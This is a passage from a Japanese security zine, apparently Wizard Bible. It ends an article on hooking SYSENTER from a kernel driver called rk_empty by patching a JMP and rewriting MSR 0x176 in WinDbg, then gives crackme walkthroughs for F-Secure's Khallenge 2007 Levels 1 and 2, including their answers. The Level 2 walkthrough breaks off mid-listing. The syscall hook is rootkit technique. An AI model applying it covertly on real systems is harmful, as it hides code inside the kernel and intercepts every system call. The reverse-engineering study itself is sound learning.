+となり、結果「E9 91 1a 3d 86」となる。そして、fa10f4d9以降の5バイトにこの
+JMP命令を記述する。
+
+-----  WinDbg（Memory）
+fa10f4d4  8b ff 55 8b ec e9 91 1a 3d 86 90 68 d4 f4 10 fa 68 b0
+fa10f4e6  f4 10 fa e8 18 00 00 00 8b 45 08 59 c7 40 34 a2 f4 10
+fa10f4f8  fa 59 33 c0 5d c2 08 00 cc cc cc cc cc cc ff 25 84 f5
+..........
+-----
+
+　そして、再度逆アセンブルして確認する。
+
+-----  WinDbg
+kd> u fa10f4d4
+rk_empty!DriverEntry [c:\winddk\rootkit\rk_empty\rk_empty.c @ 11]:
+fa10f4d4 8bff            mov     edi,edi
+fa10f4d6 55              push    ebp
+fa10f4d7 8bec            mov     ebp,esp
+fa10f4d9 e9911a3d86      jmp     nt!KiFastCallEntry (804e0f6f)
+fa10f4de 90              nop
+fa10f4df 68d4f410fa      push    offset rk_empty!DriverEntry (fa10f4d4)
+fa10f4e4 68b0f410fa      push    offset rk_empty!OnUnload+0xe (fa10f4b0)
+fa10f4e9 e818000000      call    rk_empty!DbgPrint (fa10f506)
+-----
+
+　うまく、fa10f4d9に、オリジナル（804e0f6f）へジャンプする命令が記述され
+ている。あとは、MSRの値をfa10f4d9に変更することで、SYSENTERが、rk_emptyの
+DriverEntryを通ることになる。
+
+-----  WinDbg
+kd> wrmsr 176 fa10f4d9
+kd> rdmsr 176
+msr[176] = 00000000`fa10f4d9
+kd> g
+-----
+
+　Windowsは正常に動作する。ただし、メモリ領域は、こちら側が用意したrk_em
+ptyのDriverEntryを利用しているため、rk_emptyをOSからアンロードしたら、ジ
+ャンプ先がなくなり、OSがフリーズしてしまう。
+　試しに、rk_emptyをアンロードすると、以下のメッセージが表示された。
+
+-----  WinDbg
+rk_empty: OnUnload called.
+
+*** Fatal System Error: 0x000000ce
+                       (0xFA10F4D9,0x00000000,0xFA10F4D9,0x00000000)
+
+Driver at fault:
+Break instruction exception - code 80000003 (first chance)
+
+A fatal system error has occurred.
+Debugger entered on first try; Bugcheck callbacks have not been invoked.
+
+A fatal system error has occurred.
+-----
+
+　よって、rk_emptyをアンロードする場合は、必ず、MSRのアドレスを元に戻して
+おく必要がある。
+
+-----  WinDbg
+kd> wrmsr 176 804e0f6f
+kd> rdmsr 176
+msr[176] = 00000000`804e0f6f
+-----
+
+　これで、元通りとなる。
+
+
+■0x05.) さいごに
+
+　今回はWinDbgでSYSENTERのジャンプ先を変更しただけだったが、実用を考える
+ならば、SYSENTERの呼び出しをすべてログに保存するなども可能である。まぁ、
+SYSENTERフックが必要な場面が、それほどあるとは思えないが、なかなか楽しめ
+る内容だったと思う。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第4章: リバースエンジニアリング実践 khallengeへのチャレンジ その1 ---
+
+著者：Green boy 4
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　はじめまして。Green boy4と申します。初めて投稿いたします。初心者でNo S
+killですが、Skill upのために勉強中ですので、どうぞよろしくお願いします。
+
+　私自身がいろいろとバタバタしていたため、文章をまとめるのに時間がかかり、
+ちょっと旬を過ぎていますが、khallenge 2007ネタを書いていた何人かのブログ
+を拝見したところ、あきらめてしまった方が多かったようなので、いつもお世話
+になっているWizard Bibleを通じて皆様に貢献できればと思い、投稿いたしまし
+た。
+
+
+■0x02.) Khallengeとは？
+
+　さて、2007年8月某日に「F-Secure Reverse Engineering Challenge 2007(通称
+khallenge 2007)」が開催されました。これは一言で言うと、制限時間内にcrack
+meのようなものなのをいくつかクリアするゲームといった感じなのですが、内輪
+でちょっと話題になっていたので、私も挑戦してみました。
+
+　やり方ですがhttp://www.khallenge.com/にアクセスすると、Level1のバイナリ
+へのリンクが貼られたページが表示されますので、Level1をダウンロードして解
+析します。
+
+　解析に成功するとメールアドレスが表示されますので、取得したメールアドレ
+スへメールを送信すると、正解の場合は次のレベルへのダウンロードリンク付き
+のメールが返信されてきます。それをまた解析し、メールを送信します。この繰
+り返しで、チャレンジはLevel3まで存在します。
+
+　ただし残念ながら、上記URLは現在ではすでにアクセスできなくなっていますし、
+解析してメールアドレスを得て、そこにメールを送信しても返信されないと思い
+ます。ですが、以下のURLにアクセスすれば、バイナリは入手可能ですので、もし
+ご興味のある方は挑戦してみてはいかがでしょうか？
+
+http://www.f-secure.com/security_center/asm.html
+
+　Level3は文章が非常に長くなるので次回以降に発表するとして、今回はウォー
+ムアップ代わりに、Level1と2を実施してみたいと思います。
+
+
+■0x03.) 環境
+
+　今回、私は以下の環境で実施しました。
+
+・OS：Windows XP Pro SP2
+・Debugger：OllyDbg（http://www.ollydbg.de/）
+・Debugger Plugin：OllyDump
+
+※DokoDonさんがサイトを閉めてしまっているようなので、googleなどから検索し
+てダウンロードしてください。
+
+　また、できればIDA Proがあればグラフ機能やDisassemble機能が強力なので効
+率面で有利ですが、必須ではありません。グラフ機能を利用したいのであれば、
+OllyGraphやOllyFlow、それからImmunity Debuggerで表示することも可能なので、
+合わせて利用してみるのもひとつの手だと思います。
+
+http://www.immunitysec.com/products-immdbg.shtml
+
+　ただし、OllyGraphやOllyFlowはwingraph32が必要です。IDA Proのページでソ
+ースコードはダウンロード可能ですが、コンパイルにはBorland CBuilder v5が必
+要です。また、私の環境ではOllyGraphやOllyFlowを動作させたところ、うまく動
+作したりしなかったりだったので、どこまで使えるかは未知数です。
+
+
+■0x04.) まず実行
+
+　さて、非常に前置きが長くなってしまいましたが、本題に入ります。
+　まずLevel1のバイナリをダウンロードしておもむろに実行します。
+
+　本当のリバースエンジニアリングであれば、まずPEiDでパッカーの有無をチェ
+ックしたり、stringsコマンドで得られる文字列を確認して…、となるところです
+が、今回はお遊びなので、そういったツッコミはなしの方向でお願いします ;-)
+
+-----　FSC_Level1.exe実行画面
+Assembly 2007 Reverse-Engineering Challenge - Level 1
+Copyright (c) 2007 F-Secure Corporation
+
+For more informations visit:
+http://www.f-secure.com/security_center/asm.html
+
+Enter the key:
+-----
+
+　Keyの入力を促す画面が出て一時停止しました。
+　とりあえず、適当な文字列を入力したところ、以下のメッセージが表示されま
+した。
+
+
+-----　入力後に表示されたメッセージ
+Sorry, this key is not valid!
+Press enter to terminate...
+-----
+
+　当然ですが、Keyがあっていないので、メールアドレスが表示されませんでした。
+
+　ではOllyDbgで読み込んでみましょう。 
+
+
+■0x05.) OllyDbgで読み込んで実行
+
+　とりあえず、OllyDbgにFSC_Level1.exeをドラッグ＆ドロップしてから、ざっと
+眺めてみます。すると、すぐKeyの入力処理部分が見つかりました。
+
+-----　OllyDbgのCPUウィンドウ（69001056付近）
+69001056  |.  68 20300069   PUSH FSC_Leve.69003020                   ; /format = "Assembly 2007 Reverse-Engineering Challenge - Level 1
+Copyright (c) 2007 F-Secure Corporation
+
+For more informations visit:
+http://www.f-secure.com/security_center/asm.html
+
+Enter the key: "
+6900105B  |.  FFD6          CALL ESI                                 ; \printf
+6900105D  |.  68 A0310069   PUSH FSC_Leve.690031A0
+69001062  |.  68 BC200069   PUSH FSC_Leve.690020BC                   ; /format = "%s"
+69001067  |.  FF15 7C200069 CALL DWORD PTR DS:[<&MSVCR71.scanf>]     ; \scanf
+-----
+
+　また、Keyと入力値を比較しているのはどこかな？と探したところ、これまたそ
+のすぐ後にあるのを発見しました。
+
+-----　OllyDbgのCPUウィンドウ（690010BF付近）
+690010BF  |.  68 10330069   PUSH FSC_Leve.69003310                   ; /s2 = ""
+690010C4  |.  68 A0310069   PUSH FSC_Leve.690031A0                   ; |s1 = ""
+690010C9  |.  FF15 88200069 CALL DWORD PTR DS:[<&MSVCR71._stricmp>]  ; \_stricmp
+690010CF  |.  83C4 3C       ADD ESP,3C
+690010D2  |.  85C0          TEST EAX,EAX                             ; 一致していたらeax=0
+690010D4  |.  75 1D         JNZ SHORT FSC_Leve.690010F3              : 0の場合はジャンプせず
+690010D6  |.  68 10330069   PUSH FSC_Leve.69003310                   ; s2の値をPUSH
+690010DB  |.  68 E8300069   PUSH FSC_Leve.690030E8                   ;  ASCII "
+Congratulations! Please send an e-mail to ThisIs%s@khallenge.com
+Press enter to terminate...
+"
+-----
+
+　690010C9ではstricmpで比較し、文字列が一致していた場合（戻り値であるeax
+には0が入るので）は、690010D2とD4の判定ではジャンプせずにそのまま次の命令
+（690010D6）に進むという処理のようです。そこには「Congratulations!～」の
+文字が見えるので、ここがチェックポイントとなるようです。ということで、こ
+こにブレークポイントを張って引数の状態を見て見ましょう。ブレークポイント
+は690010C9を選択後、F2で設定。実行はF9です。
+　実行すると、ブレークポイントに達する前にKeyの入力を促す例のメッセージが
+表示されるので、今回は適当に「aaaaa」と入力してみました。入力が終わると、
+ブレークポイントを設定した690010C9で停止しします。
+
+-----　ブレークポイント時点のCPUウィンドウ
+690010BF  |.  68 10330069   PUSH FSC_Leve.69003310                   ; /s2 = "Asm07REC"
+690010C4  |.  68 A0310069   PUSH FSC_Leve.690031A0                   ; |s1 = "aaaaa"
+690010C9  |.  FF15 88200069 CALL DWORD PTR DS:[<&MSVCR71._stricmp>]  ; \_stricmp
+-----
+
+　やはり、入力した文字列と比較しているようです。ということは、「Asm07REC」
+が正解の文字列なのでしょうか？再度実行してこの文字列を入力して確認してみ
+ようと思います。
+
+　Ctrl+F2でデバッグをリスタートします。
+
+
+■0x06.) 正しい文字列を入力して実行
+
+　リスタート後に再度F9で実行し、入力が要求されたら今度は「Asm07REC」と入
+力します。再度ブレークポイントで停止すると以下のようになります。
+
+-----　ブレークポイント時点のCPUウィンドウ
+690010BF  |.  68 10330069   PUSH FSC_Leve.69003310                   ; /s2 = "Asm07REC"
+690010C4  |.  68 A0310069   PUSH FSC_Leve.690031A0                   ; |s1 = "Asm07REC"
+690010C9  |.  FF15 88200069 CALL DWORD PTR DS:[<&MSVCR71._stricmp>]  ; \_stricmp
+-----
+
+　今度は入力した文字列が一致していることがわかります。では、F9で最後まで
+実行してみましょう。
+
+-----　入力後に表示されたメッセージ
+Congratulations! Please send an e-mail to ThisIsAsm07REC@khallenge.com
+Press enter to terminate...
+-----
+
+　正しい文字列が得られたようです。このメールアドレスにメールを送信したと
+ころ、Level2へのリンクが貼られたメールが送信されてきました。
+
+
+■0x07.) 所感
+
+　Level1は、以上のように非常に簡単でした。わからなくても、F8（Step over）
+などで1行ずつステップ実行していくとコメント欄に正解ができてしまうので、デ
+バッガの使い方さえわかれば誰でも解けてしまうような問題でした。
+
+　図に乗りやすい私は、「なんだ、こんな程度か」と思ってしまい、実はこの
+後のLevel2でハマることになるのです。
+
+　それでは、その1はこの辺で。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第5章: リバースエンジニアリング実践 khallengeへのチャレンジ その2 ---
+
+著者：Green boy 4
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　またまたGreen boy 4です。Level1の前項に続き、Level2について記述します。
+
+
+■0x02.) まず実行
+
+　Level1をクリアしたため、Level2を実施します。Level2を実行すると、下記内
+容のポップアップが表示されますが、どこにも入力するような欄はありません。
+OKボタンが押せるのみです。
+
+-----　ポップアップの内容
+Assembly 2007 Reverse-Engineering Challenge - Level2
+Copyright (c) 2007 F-Secure Corporation
+
+
+For more information visit
+http://www.f-secure.com/security_center/asm.html
+-----
+
+　さて、どうしたものでしょうか？
+　やはりここは、デバッガで読み込んで解析してみましょう。
+
+
+■0x03.) OllyDbgで読み込み
+
+　OllyDbgにFSC_Level2.exeをドラッグ＆ドロップします。ポップアップが表示さ
+れるということは、MessageBox APIを実行していると思われるため、まずそれを
+探そうとしました。Alt+EでExecutable Moduleを開き、Nameが「FSC_Leve」と表
+示された部分をクリック後、Ctrl+NでNameウィンドウを開きましょう。
+
+-----　FSC_LeveのNameウィンドウ
+Names in FSC_Leve
+Address    Section    Type    (  Name                                    Comment
+00407044   UPX2       Import  (  KERNEL32.ExitProcess
+00407040   UPX2       Import  (  KERNEL32.GetProcAddress
+0040703C   UPX2       Import  (  KERNEL32.LoadLibraryA
+004062A0   UPX1       Export     <ModuleEntryPoint>
+0040704C   UPX2       Import  (  USER32.wsprintfA
+-----
+
+　この5つしか表示されませんでした。また、Sectionを見ると、UPXという文字列
+が見えます。ということはUPXでパックされているために、本来のAPIが表示され
+ていないということが予想できます。
+
+　UPXはパック、アンパックが双方向で行なえるので、UPXでアンパックすればよ
+いのですが、せっかくリバースエンジニアリングをしているので、OllyDbgでアン
+パックをしてみましょう。
+
+
+■0x04.) OllyDbgでアンパック
+
+　UPXは素直なパッカーなので、単純にオリジナルコードをメモリ上に展開後、そ
+のセクションにJMPします。そのJMP先がOEP(オリジナルエントリーポイント)にな
+ります。また、UPXのもうひとつの特徴として、JMPの直前にはPOPAD命令があるの
+が特徴です。まず、そこを見つけます。
+
+　Alt+MでMemory mapウィンドウを開きます。
+
+-----　Memory mapウィンドウの内容
+Memory map
+Address    Size       Owner      Section    Contains      Type   Access    Initial   Mapped as
+00400000   00001000   FSC_Leve              PE header     Imag   R         RWE
+00401000   00005000   FSC_Leve   UPX0                     Imag   R         RWE
+00406000   00001000   FSC_Leve   UPX1       code          Imag   R         RWE
+00407000   00001000   FSC_Leve   UPX2       data,imports  Imag   R         RWE
+-----
+
+　現在、OllyDbgは4062A0で停止しているため、406000のセクションはUPXのSFXコ
+ードです。また、40700はUPXのdataやimportsセクションであり、残りの401000の
+セクションにJMPするはずなので、そのセクションへのJMP命令とPOPAD命令を見つ
+けます。
+
+　OllyDbgのコマンド検索は、v1.xではオペランドまできっちり指定しないとコマ
+ンド検索ができないという制約があります。そのため、オペランドのいらないPO
+PADを検索してみます。Ctrl+FでFind Commandウィンドウを開き、「POPAD」と入
+力して検索します。
+
+-----　検索結果1
+004061F1   . /65:73 73      JNB SHORT FSC_Leve.00406267              ;  Superfluous prefix
+004061F4   . |61            POPAD
+004061F5   . |67:65:42      INC EDX                                  ;  Superfluous prefix
+-----
+
+　POPADの後にJMP命令がないので、この場所は違います。よって、Ctrl+Lを押し、
+次の候補を見てみます。
+
+-----　検索結果2
+004063BB   > \61            POPAD
+004063BC   .- E9 99AFFFFF   JMP FSC_Leve.0040135A
+004063C1      00            DB 00
+-----
+
+　出ました。POPADとJMP命令のコンビであり、401000のセクションへのJMP命令で
+す。このJMP先がOEPになるので、まずここ（4063BC）にブレークポイントを張っ
+て実行後、F7を押してStep intoで1命令だけ処理を進めます。
+
+-----　OEP周辺のCPUウィンドウ
+0040135A    50              PUSH EAX
+0040135B    35 08714200     XOR EAX,427108
+00401360    1BC2            SBB EAX,EDX
+00401362    870424          XCHG DWORD PTR SS:[ESP],EAX
+00401365    8F05 64204000   POP DWORD PTR DS:[402064]
+0040136B    68 00104000     PUSH FSC_Leve.00401000
+00401370    C3              RETN
+00401371  - FF25 50304000   JMP DWORD PTR DS:[403050]                ; USER32.MessageBoxA
+00401377  - FF25 54304000   JMP DWORD PTR DS:[403054]                ; USER32.wsprintfA
+0040137D  - FF25 5C304000   JMP DWORD PTR DS:[40305C]                ; kernel32.GetCommandLineA
+00401383    0000            ADD BYTE PTR DS:[EAX],AL
+-----
+
+　では、この時点のメモリイメージをDumpし、IAT Rebuildするという作業をOll
+yDumpで実施してしまいましょう。PluginメニューからOllyDump->Dump Debugged
+ Processを選び、そのままDumpをクリックし、保存先を指定すればアンパック完
+成です。
+
+　勉強の意味でいうと、本当はIAT Rebuildも自分で実施すればよいのですが、今
+回は面倒なのでOllyDumpの機能で行なってしまいました。興味のある方はご自身
+で実施してみるのはいかがでしょうか？
+
+
+■0x05.) アンパックしたファイルをOllyDbgで読み込み
+
+　では、アンパックをしたファイルをOllyDbgにドラッグ＆ドロップして見てみま
+しょう。Nameウィンドウを表示させてみたところ、今度はGetCommandLineが見え
+ます。
+
+　それ以外のAPIはGetCommandLineとwsprintfだけという、なんともシンプルな構
+成のようです。LoadLibraryもないので、これ以上のAPIが呼び出されることはな
+さそうです。
+
+-----　FSC_LeveのNameウィンドウ
+Names in FSC_Leve
+Address    Section    Type    (  Name                                    Comment
+0040305C   UPX0       Import  (  kernel32.GetCommandLineA
+00403050   UPX0       Import  (  USER32.MessageBoxA
+00401352   UPX0       Export     <ModuleEntryPoint>
+00403054   UPX0       Import  (  USER32.wsprintfA
+-----
+
+　さて、再度エントリーポイント周辺を見てください。
+
+-----　OEP周辺のCPUウィンドウ
+00401352 > $  33DB          XOR EBX,EBX
+00401354   .  68 5A134000   PUSH FSC_Leve.0040135A
+00401359   .  C3            RETN                                     ;  RET used as a jump to 0040135A
+0040135A   >  50            PUSH EAX
+0040135B   .  35 08714200   XOR EAX,427108
+00401360   .  1BC2          SBB EAX,EDX
+00401362   .  870424        XCHG DWORD PTR SS:[ESP],EAX
+00401365   .  8F05 64204000 POP DWORD PTR DS:[402064]
+0040136B   .  68 00104000   PUSH FSC_Leve.00401000
+00401370   .  C3            RETN                                     ;  RET used as a jump to 00401000
+00401371   .- FF25 50304000 JMP DWORD PTR DS:[<&USER32.MessageBoxA>] ;  USER32.MessageBoxA
+00401377   .- FF25 54304000 JMP DWORD PTR DS:[<&USER32.wsprintfA>]   ;  USER32.wsprintfA
+0040137D   .- FF25 5C304000 JMP DWORD PTR DS:[<&kernel32.GetCommandL>;  kernel32.GetCommandLineA
+-----
+
+　401359のRETN、401370のRETNのコメント欄を見ると、面白いことが書いてあり
+ます。
+
+-----　401359のコメント欄
+RET used as a jump to 0040135A
+-----
+
+　このRET命令はJMP命令として動作していますよ、とOllyDbgが判断しているので
+す。RET命令の内部の動作的には、スタックからPOP、POPしたアドレスへのJMPな
+ので、その時点でスタックに入っている値がその飛び先というわけです。つまり、
+通常の用途である、Call命令に対応するRETではなく、トリッキーなジャンプ命令
+としてRETを使っています。ということは、401354-401359、40136B-401370の命令
+のセットは、それぞれ40135AへのJMP、401000へのJMPと判断できるわけです。こ
+の処理内容を把握するにはF8を押してStep実行していったほうが理解しやすいか
+もしれません。また、このブロックが終わった後の飛び先である401000に関して
+も、同じことが言えます。
+
+-----　401000周辺
+00401000   >  54            PUSH ESP
+00401001   .  890424        MOV DWORD PTR SS:[ESP],EAX
+00401004   .  B8 6D114000   MOV EAX,FSC_Leve.0040116D
+00401009   .  870424        XCHG DWORD PTR SS:[ESP],EAX
+0040100C   .  C2 0000       RETN 0
+-----
+
+　先ほどより少し複雑にしていますが、これらの命令は40116Dへ単純にJMPする
+だけの処理です。そのため、エントリーポイント周辺を以下のように変更しても
+動くでしょう。
+
+-----　OEP周辺を少しだけ改造
+00401352 > $  33DB          XOR EBX,EBX
+00401354      90            NOP                    ; PUSHとRETNをNOPで潰す
+00401355      90            NOP
+00401356      90            NOP
+00401357      90            NOP
+00401358      90            NOP
+00401359      90            NOP
+0040135A   >  50            PUSH EAX
+0040135B   .  35 08714200   XOR EAX,427108
+00401360   .  1BC2          SBB EAX,EDX
+00401362   .  870424        XCHG DWORD PTR SS:[ESP],EAX
+00401365   .  8F05 64204000 POP DWORD PTR DS:[402064]
+0040136B    ^ E9 FDFDFFFF   JMP FSC_Leve.0040116D  ; PUSHとRETNをJMPに変更
+-----
+
+　なぜこのような一見すると無駄な処理が行なわれているのでしょうか？　これ
+は、推測ですが、デバッガやディスアセンブラ対策ではないかと考えています。
+事実、OllyDbgではエントリーポイント周辺のRET命令を解釈してくれましたが、
+401000の処理はJMP命令の代わりであると判定してくれませんでした。
+
+　また、Immunity Debuggerのグラフ機能に至っては、エントリーポイント周辺の
+RET命令すらJMPとは判定せずに、そこから先の処理をグラフ化できませんでした。
+
+　このように、今回のレベルはLevel1から比べると、多少なりともレベルが上が
+っているのではないかと推測ができます。
+
+
+■0x06.) Level2を実行しながら解析
+
+　さてCPUウィンドウのディスアセンブル結果だけを静的解析するのもいいですが、
+私のような初心者だと、効率が非常によくありません。そこで、デバッガ上で実
+行して挙動を見ながら、ディスアセンブル結果も併せて確認し、解析していく、
+という解析手法を取りたいと思います。
+
+　この手法は、実行させて挙動を把握するブラックボックス分析と、ディスアセ
+ンブル結果から挙動を把握するホワイトボックス分析を同時に実施することから、
+グレーボックス分析と呼ばれています。
+
+　この場合、全部をStep intoで実行すると日が暮れてしまうので、状況に応じて
+以下のことを組み合わせて使います。
+
+ o F9 Run
+ o F8 Step over
+ o F7 Step into
+ o F2 Breakpoint
+ o Ctrl+F9 Execute till return
+ o Alt+F9 Execute till user code
+ o Ctrl+F11 Trace into
+ o Ctrl+F12 Trace over
+ o Hardware breakpoint, breakpoint memory on read/write
+
+などなど
+
+　例えばですが、F8でざっくり実行していったら、ループに入ってしまったとい
+う場合、何周かそのループをさせてみて、何を行なっているか把握できたら、ル
+ープの直後の命令にBreakPointを張って、残りはCtrl+F12なりF9で残りのループ
+処理を飛ばしてしまうという方法で時間短縮をします。
+
+　実行の際は、トレースを取っておくと便利です。勢いあまって進みすぎてしま
+った場合でも、「-」で逆戻りしてレジスタの値を見ることができます。
+
+　また、トレースを行なう際、Kernel32.dllなどのWindows APIまで解析すること
+はないと思うので、「Options」メニューから「Debugging options」を選択し、
+Traceタブに切り替え後、「Always trace over system DLLs」にチェックしてお
+くのがよいでしょう。
+
+　今回の場合は、以下の方法で解析しました。
+
+ o F8でざっくりとStep実行し、どんなデータがスタックやHeapに入るのかを見る
+ o Ctrl+F12でTrace overし、Trace logからMessageBox APIをCALLしている部分
+   を探し、そこからさかのぼって条件分岐（JNZやJBEなどのJMP以外のジャンプ
+   命令）を探す
+ o IDAのグラフ機能を使って条件分岐前後の処理をブロック単位で見て、処理を
+   把握する
+
+　上記の方法で、以下のようなことがわかりました。
+
+ o 40118B-4011B5でループして、実行時のコマンドのフルパスの文字列を読み込
+   んで文字数をカウントしている
+ o Congratulations!というメッセージを代入している処理が401245からのブロッ
+   クに存在
+ o Congratulations!のブロックにたどり着くまでに、3箇所のチェックポイント
+   が存在
+   そのポイント（JNZ）は以下のアドレス
+     + 4011E1
+     + 40121D
+     + 40123F
+ o 送付先のメールアドレスはLuckyNumberIs_%x_FSC@khallenge.comであり、%xに
+   相当する部分をどこかの処理で算出している
+
+
+■0x07.) チェックポイントをNOPでつぶす
+
+　前項では、Congratulations!という、おそらくクリアしたときに表示される文
+字列であろうブロックと、そこにたどり着くまでのチェックポイントを洗い出し
+ました。そこでちょっと無理やりではありますが、このチェックポイントを書き
+換え、強制的に到達させるとクリアできないか？　と考えました。
+
+　条件付ジャンプを自分の思い通りにするには、主に以下が考えられます。
+
+・ジャンプするように、JMPに書き換える
+・ジャンプしないように、NOPに書き換える
+
+　今回の場合、書き換え対象は全てJNZであり、値が0のときにジャンプせずにク
+リアのブロックに流れるようなので、ジャンプしないように3つのJNZをすべてNO
+Pに書き換えます。
+
+・Ctrl+Gで4011E1へ移動
+JNZ上で右クリックメニューからBinary -> Fill with NOPsをクリック
+
+・Ctrl+Gで40121Dへ移動
+JNZ上で右クリックメニューからBinary -> Fill with NOPsをクリック
+
+・Ctrl+Gで40123Fへ移動
+JNZ上で右クリックメニューからBinary -> Fill with NOPsをクリック
+
+　以上を実施後にF9で実行してみましょう。すると、以下のポップアップが表示
+されるはずです。
+
+-----　表示されたポップアップの内容
+Assembly 2007 Reverse-Engineering Challenge - Level 2
+Copyright (c) 2007 F-Secure Corporation
+
+
+Congratulations!
+Please send an e-mail to LuckyNumberIs_22657865_FSC@khallenge.com
+-----
+
+　メールアドレスとしても成り立っているので、正しそうです。「なんだ、簡単
+じゃないか」と思い、このアドレスにメールを送りました。しかし、いつまで経
+ってもメールが返ってきません。
+
+　実は、Level1のときも2通メールを送ってやっと1通返ってきたということがあ
+ったので、メールの遅配があるのかな？　と2度、3度と送ってみましたが、やは
+り戻ってくる気配がありません。
+
+　どうやら、まんまと罠に引っかかってしまったようです。この方法では正規の
+メールアドレスが得られないようなので、さらに解析をしていきます。
+
+
+■0x08.) チェックポイント付近の処理を調査
+
+　前項で、無理やりクリアの処理まで持っていきましたが、やはりそれではうま
+くいかないようです。よって、解析を続行しなければならないのですが、クリア
+に到達するまでのチェックポイントは前回までの解析で判明しているので、どう
+すればその条件を満たせるのかを見ていけばわかるはずです。
+
+　まず、4011E1のチェックから見ていきたいと思います。
+
+-----　チェックポイント1の前の処理
+004011B5   .^\75 D4         JNZ SHORT FSC_Leve.0040118B  ; 実行パスをカウントするループの終端
+004011B7   .  54            PUSH ESP
+004011B8   .  890424        MOV DWORD PTR SS:[ESP],EAX
+004011BB   .  89C0          MOV EAX,EAX
+004011BD   .  870424        XCHG DWORD PTR SS:[ESP],EAX
+004011C0   .  31C0          XOR EAX,EAX
+004011C2   .  8A42 FB       MOV AL,BYTE PTR DS:[EDX-5]   ; 注意点1
+004011C5   .  870424        XCHG DWORD PTR SS:[ESP],EAX
+004011C8   .  54            PUSH ESP
+004011C9   .  890424        MOV DWORD PTR SS:[ESP],EAX
+004011CC   .  89C0          MOV EAX,EAX
+004011CE   .  870424        XCHG DWORD PTR SS:[ESP],EAX
+004011D1   .  31C0          XOR EAX,EAX
+004011D3   .  B0 20         MOV AL,20                    ; 注意点2
+004011D5   .  870424        XCHG DWORD PTR SS:[ESP],EAX
+004011D8   .  874424 04     XCHG DWORD PTR SS:[ESP+4],EAX
+004011DC   .  3B0424        CMP EAX,DWORD PTR SS:[ESP] ; チェックポイント1のチェック
+004011DF   .  58            POP EAX
+004011E0   .  58            POP EAX
+004011E1      0F85 15010000 JNZ FSC_Leve.004012FC  ; チェックポイント1の分岐点
+-----
+
+　40118B-4011B5は実行時のコマンドのフルパスをカウントしている処理と思われ
+るので、その後の処理はこれに関連するものであることが推測できます。
+
+　4011B7にブレークポイントを設定し、レジスタの状態を見てみましょう。
+
+-----　4011B7時点でのレジスタの内容
+EAX 00141EE8 ASCII ""C:\FSC_Level2_unpacked.exe""
+ECX 0012FFB0
+EDX 00141F04
+EBX 00000000
+ESP 0012FFA4
+EBP 0012FFF0
+ESI FFFFFFFF
+EDI 7C950738 ntdll.7C950738
+EIP 004011B7 FSC_Leve.004011B7
+-----
+
+　注目すべきはEAXとEDXの値でしょう。Dumpウィンドウをクリックし、Ctrl+Gで
+EAXに移動してみましょう。
+
+-----　4011B7時点でのDumpウィンドウの内容
+00141EE8  22 43 3A 5C 46 53 43 5F  "C:\FSC_
+00141EF0  4C 65 76 65 6C 32 5F 75  Level2_u
+00141EF8  6E 70 61 63 6B 65 64 2E  npacked.
+00141F00  65 78 65 22 00           exe".
+-----
+
+　EAXにはパスの最初、EDXにはパスの最後のアドレスが格納されているようです。
+
+　そのままF8でStep実行していったところ、4011C5において、EDX-5、つまり5文
+字手前の文字列を計算し、それを4011DCのcmpで20（スペース）と比較しているこ
+とがわかりました。現状では、5文字手前は「.」になります（末尾5文字は「.exe
+"」なので）。つまり、5文字手前はスペースでないといけないということです。
+
+　しかし、ここで問題なのは「.」は拡張子の区切り文字なので、単純にスペース
+に置き換えるとダブルクリックでは実行できなくなってしまいます。さてどうし
+たものでしょうか？　勘のいい方ならお気づきかもしれませんが、実はこのプロ
+グラムには引数が必要だったのです。
+
+　5文字前がスペースとなるように調整すると、引数は4文字ということになり、
+引数を「abcd」と仮定した場合、以下の形になります。
+
+-----　引数の予想
+"C:\FSC_Level2_unpacked.exe" abcd
+------
+
+　OllyDbgでは、DebugメニューからArgumentsを選択すると、解析対象に引数を与
+えられます。引数を与えた後、Ctrl+F2でリスタートしましょう。
+
+
+■0x09.) チェックポイント2
+
+　さて、4011DCにブレークポイントを張って、そこまで実行してみましょう。目
+論見どおり、EAXと[ESP]の値が一致し、4011E1のJNZをジャンプせずに通過できま
+した。
+
+　では、チェックポイント2に移ります。
+
+-----　チェックポイント2の前の処理
+004011E1   . /0F85 15010000 JNZ FSC_Leve.004012FC         ; チェックポイント1
+004011E7   . |D3C0          ROL EAX,CL
+004011E9   . |8B42 FC       MOV EAX,DWORD PTR DS:[EDX-4]  ; 注意点1
+004011EC   . |35 6D562855   XOR EAX,5528566D              ; 注意点2
+004011F1   . |30FC          XOR AH,BH
+004011F3   . |54            PUSH ESP
+004011F4   . |890424        MOV DWORD PTR SS:[ESP],EAX
+004011F7   . |89C0          MOV EAX,EAX
+004011F9   . |870424        XCHG DWORD PTR SS:[ESP],EAX
+004011FC   . |31C0          XOR EAX,EAX
+004011FE   . |8A42 FA       MOV AL,BYTE PTR DS:[EDX-6]     ; 注意点3
+00401201   . |870424        XCHG DWORD PTR SS:[ESP],EAX
+00401204   . |54            PUSH ESP
+00401205   . |890424        MOV DWORD PTR SS:[ESP],EAX
+00401208   . |89C0          MOV EAX,EAX
+0040120A   . |870424        XCHG DWORD PTR SS:[ESP],EAX
+0040120D   . |31C0          XOR EAX,EAX
+0040120F   . |B0 22         MOV AL,22                      ; 注意点4
